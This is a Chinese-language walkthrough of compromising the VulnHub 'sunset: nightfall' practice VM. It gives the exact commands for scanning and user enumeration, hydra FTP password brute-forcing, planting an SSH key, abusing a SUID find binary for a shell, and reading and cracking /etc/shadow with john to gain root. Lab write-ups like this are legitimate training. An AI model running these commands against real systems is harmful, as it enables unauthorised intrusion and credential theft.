# vulnhub之sunset的实践

本周末实践的是vulnhub的sunset镜像，

下载地址，https://download.vulnhub.com/sunset/nightfall.zip，

先用workstation导入的ova，kali没扫出来地址，又重新用virtualbox导入，

再地址扫描，能拿到地址了，

sudo netdiscover -r 192.168.1.0/24

![](../Images/ef223b815932b792b32fa88b45b529bf.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.1.104，

扫出来的服务比较多，重点看samba和ftp，

![](../Images/9cb944e4429f8302fc1a5483858d2f93.png)

先扫一下samba的用户，sudo enum4linux 192.168.1.104，

![](../Images/26354bee28231741e132bcb827fb780f.png)

能看到靶机有两个账户，nightfall和matt，直接上hydra做ftp的密码爆破，

sudo hydra -l matt -P /usr/share/wordlists/rockyou.txt 192.168.1.104 ftp，nightfall没破出来，matt破出来了，matt/cheese，

![](../Images/64a6b5e69e1af56a23c2bd6fe674cbff.png)

登录ftp看看，能看到这是matt账户的home目录，  

![](../Images/40aa389456ae2139e52c534d6060e5eb.png)

虽然不知道ssh的密码，但是可以上传个公钥，用私钥认证登录，

在kali攻击机上制作公私钥，ssh-keygen，  

![](../Images/347b416c8528037539e76967a2b60bc0.png)

cat id\_rsa.pub > authorized\_keys，

再次ftp登录，把公钥传上去，  

![](../Images/2fac53d65e3abf9b63937c13a2c7d651.png)

就能ssh登录进去了，id看一下不是root，需要继续提权，

![](../Images/dd698cba473ce6e6fbed2a9f756499aa.png)

老办法，find / -perm -u=s -type f 2>/dev/null，

![](../Images/e0428f21e5266e1fdd5f622725ccf04c.png)

发现/scripts/find可用，再弹一个shell出来，

/scripts/find /var/www/html/index.html -exec /bin/sh -p \\;

id看一下，发现不是root，但是可以控制nightfall账户了，继续上传公钥，

![](../Images/8a50a02835e032010477e1d680338ba5.png)

再用nightfall进行ssh登录，id看一下，当然不是root，

![](../Images/c4d3bb86d840d510912d80d7ee7069c7.png)

之前matt账户是不能sudo -l的，但nightfall账户可以sudo -l，

![](../Images/373aef93347ee6c03a92a2d415fe5cfa.png)

发现/usr/bin/cat可用，那就把/etc/passwd和/etc/shadow都搞出来，

在kali攻击机上合并，

sudo unshadow passwd.txt shadow.txt > passwords.txt，

再用john破解，sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt，这就拿到root的密码了，

![](../Images/743373e21b9b65f7319a49392b8f2bdd.png)

最后再回到nightfall的shell下su -，就拿到root权限了，

![](../Images/d082c37428bdfd0d46c18afc91f8d969.png)
